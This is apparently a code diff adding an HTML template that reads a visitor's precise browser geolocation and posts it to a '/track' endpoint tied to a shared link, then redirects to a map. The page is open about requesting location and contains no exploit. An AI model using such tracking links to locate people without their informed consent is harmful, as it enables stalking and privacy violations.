@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Getting Location...</title>
+</head>
+<body>
+    <h1>Getting your location...</h1>
+    <script>
+    var log_id = {{ log_id }};
+    var link_id = {{ link_id }};
+    var redirect_url = '/show_map/' + link_id; // Redirect to map after getting location
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error, options);
+        } else {
+            window.location.href = redirect_url; // Redirect even if geolocation fails
+        }
+    }
+
+    var options = {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+    };
+
+    function success(position) {
+        fetch('/track/' + link_id, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                log_id: log_id
+            })
+        }).then(function() {
+            window.location.href = redirect_url; // Redirect after successful location update
+        });
+    }
+
+    function error(err) {
+        console.warn('ERROR(' + err.code + '): ' + err.message);
+        window.location.href = redirect_url; // Redirect even on error
+    }
+
+    getLocation();
+    </script>
+</body>
+</html>
